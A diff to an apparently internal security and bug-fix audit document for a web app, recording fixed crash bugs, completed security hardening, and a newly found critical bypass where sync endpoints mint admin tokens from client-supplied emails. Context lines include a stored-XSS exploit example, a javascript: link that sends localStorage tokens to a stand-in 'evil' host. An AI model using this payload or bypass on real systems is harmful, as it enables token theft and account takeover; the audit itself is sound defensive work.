@@ -85,6 +85,8 @@ Errors masquerade as empty states (Marketplace, MyListings, Orders, Wishlist, Ga
 
 ## 3. Priority action list
 
+> **2026-10-07 — P0 batch complete:** every item below (§3 P0 1–18 + Pass-8 items 19–26) was **implemented in the 2026-10-07 batch** and verified by one combined test pass (battery 18/18 + 9/9 + role + dberr + p11 7/8, vitest 115/115, lint 0 errors, build ✓, XSS e2e 6/6, `dist/` 0 loopback). The ✅/❌/⚠️ markers below retain their Pass-8 state as history; **current status = all fixed** (exceptions/nuances noted inline where the fix deviated, e.g. #24 routed through slide 2, #25's ClubDetail button removed, #18 Google button hidden). Next priorities = P1 lists below + `FIXES_NEEDED.md` C7.
+
 ### P0 — Broken today (fix first; mostly small edits)
 1. `PostDetail`: add `import clsx from 'clsx'` (crash on sort tap). — **✅ FIXED** (`PostDetail.tsx:9`, `187288c`)
 2. `LockedLivePage`: declare `followers` (white screen for most users). — **✅ FIXED** (`LockedLivePage.tsx:54`)
@@ -118,7 +120,8 @@ Errors masquerade as empty states (Marketplace, MyListings, Orders, Wishlist, Ga
 26. `window.open(url, '_blank')` without `noopener` on 3 user-URL sites → reverse tabnabbing (`MediaPreviewModal.tsx:38`, `ArchiveModal.tsx:164`, `ProfessionalDashboard.tsx:228`) (A.4 #6).
 
 ### Security quick wins (Pass 8 — previously unaudited dimension; full detail in A.4)
-- **High:** #20 XSS above → P0. Storing access+refresh tokens for **all** accounts in `localStorage`, plus an immortal `sparkle_signup_refresh` that survives logout (A.4 #2), is also High but architectural → schedule as **P1 security work** (httpOnly-cookie refresh token; purge `sparkle_signup_*` on logout).
+- **Critical (found 2026-10-07, live-verified → tracked as `FIXES_NEEDED.md` C7):** `POST /api/auth/google/sync` + `/api/auth/otp/verify/sync` issue 7-day JWTs from **client-supplied emails** with no Supabase verification (unauthenticated curl → valid `role=admin` token). Not frontend scope — fix plan in C7 (verify Supabase token server-side, or delete both routes).
+- **High:** #20 XSS above → P0 (✅ fixed in the 2026-10-07 P0 batch). Storing access+refresh tokens for **all** accounts in `localStorage`, plus an immortal `sparkle_signup_refresh` that survives logout (A.4 #2), is also High but architectural → schedule as **P1 security work** (httpOnly-cookie refresh token; purge `sparkle_signup_*` on logout).
 - **Medium → P1:** OTA bundle hash never verified (A.4 #3); no CSP/SRI on the SPA origin (A.4 #4); prod console logs print `Authorization` + `x-refresh-token` (A.4 #5); SW `api-cache` survives logout (A.4 #7).
 - **Low → P2:** Giphy key in bundle, email+OTP in URL query, no client file validation, unsandboxed TikTok iframe, un-revoked object URLs (A.4 #8–12).
 - **Verified safe (A.4 S1–S8):** both `dangerouslySetInnerHTML` sites are static CSS; no `eval`/`javascript:` literal anywhere; markdown/chat/profile links scheme-locked; no open-redirect; no real secret reaches `dist` except the shared Giphy key.
@@ -420,6 +423,8 @@ Nothing new is a P0-crash, but the window introduced 1 P1 + 5 P2 regressions/hol
 Also verified clean in the window: new endpoints exist (`user.routes.js:62-64`, `auth.routes.js:37-48`); deleted files have 0 dangling refs; providers mounted once; no new hardcoded runtime URLs.
 
 ### A.4 — Security pass (12 issues + 8 safe)
+
+> **2026-10-07 — P1s complete:** #2 (httpOnly `sparkleRefresh` cookie-first refresh + `sparkle_signup_*` purge, multi-account fallback kept per user decision), #3 (OTA SHA-256 fail-closed verify), #4 (enforcing CSP + SRI in `vercel.json`/`index.html`, + `Referrer-Policy`), #5 (logger redacts Authorization/x-refresh-token/OTP query), #6 (= P0 #26), #7 (SW `api-cache` purge on logout/switch) — all implemented + probed (cookie probe 14/14, battery green, vitest 122/122, lint 0 err). Also fixed a latent **403 on browser `/auth/refresh`** (CSRF vs `sparkleToken` cookie). Remaining = Lows #8–#12 (P2).
 
 **High**
 1. **Stored XSS via `javascript:` hrefs.** Sinks: `Messages.tsx:4393-4396` (`msg.media_url` doc links), `SharedContentExplorer.tsx:315` (files), `:375` (links), `:576` (media download). Source: `messages.controller.js:263,277-279` stores `media_url`/`type` verbatim; Files/Media endpoints echo it (`:1056-1097`, `:991-1020`). Exploit: `POST /messages/send {type:'document', media_url:"javascript:fetch('https://evil/?c='+localStorage…)"}` → victim clicks attachment → token theft + takeover. **No mitigations:** no CSP on Vercel SPA (`vercel.json` no headers, no meta CSP), Helmet CSP covers only Express origin with `unsafe-inline`. **Fix:** `^https?://` guard in all 4 anchors + reject non-http(s) schemes in `sendMessage`.
